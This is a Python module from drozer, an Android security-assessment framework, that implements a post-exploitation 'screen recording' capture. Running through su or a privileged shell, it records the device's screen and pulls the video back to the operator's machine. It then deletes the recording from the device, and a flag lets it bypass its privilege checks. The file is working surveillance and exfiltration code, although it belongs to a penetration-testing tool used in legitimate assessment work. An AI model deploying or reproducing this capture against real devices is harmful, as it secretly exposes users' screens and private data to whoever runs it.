import os, subprocess, time

from drozer.modules import common, Module

class ScreenRecording(Module, common.BusyBox, common.SuperUser, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Take a video recording of the device's screen"
    description = "Take a video recording of the device's screen. Relies on minimal-su being correcly installed on the device (see tools.setup.minimalsu)"
    examples = """dz> run post.capture.screenrecording
Done. Saved at /home/user/1416002550.mp4
"""
    author = "Tyrone (@mwrlabs)"
    date = "2014-11-15"
    license = "BSD (3 clause)"
    path = ["post", "capture"]

    def add_arguments(self, parser):
        parser.add_argument("-l", "--length", default=10, help="length of the recording (in seconds)")
        parser.add_argument("--override-checks", action="store_true", default=False, help="ignore checks and use this module")

    def execute(self, arguments):

        # Check for screenrecord binary
        if not self.exists("/system/bin/screenrecord"):
            self.stdout.write("[x] No known methods for recording screen on this device. Exiting...\n")
            return

        # Check if busybox installed
        if not self.isBusyBoxInstalled():
            self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
            return

        # Check if running as privileged user
        userId = self.busyBoxExec("id -u")
        if ("1000" == userId) or ("2000" == userId) or ("0" == userId):
            privilegedUser = True
        else:
            privilegedUser = False 

        # Check for existence of minimal-su
        if not self.isMinimalSuInstalled() and not privilegedUser:
            self.stdout.write("[-] You are not a privileged user and no minimal su binary available (see tools.setup.minimalsu).\n")
            if not arguments.override_checks:
                return
            self.stdout.write("[*] Continuing...\n")
            
        # Make timestamped file name
        filename = str(int(time.time())) + ".mp4"
        
        # Record screen
        screenrecordCmd = "screenrecord --bit-rate 100000 --time-limit %s %s/recording.mp4" % (arguments.length, self.workingDir())
        chmodCmd = "chmod 666 %s/recording.mp4" % self.workingDir()
        if privilegedUser:
            self.shellExec(screenrecordCmd)
            self.shellExec(chmodCmd)
        else:
            self.suExec(screenrecordCmd)
            self.suExec(chmodCmd)
        
        # Download
        length = self.downloadFile("%s/recording.mp4" % self.workingDir(), filename)
        
        # Remove recording from device
        self.shellExec("rm %s/recording.mp4" % self.workingDir())

        # Full path to file
        fullPath = os.path.join(os.getcwd(), filename)
        
        if length != None:
            self.stdout.write("[+] Done. Saved at %s \n" % fullPath)
            
            # Open in default application
            if os.name == 'posix':
                subprocess.call(('xdg-open', filename))
            elif os.name == 'nt':
                os.startfile(filename)
            elif os.name == 'darwin':
                os.system("open " + filename);
        else:
            self.stderr.write("[-] Screen recording download failed.\n")
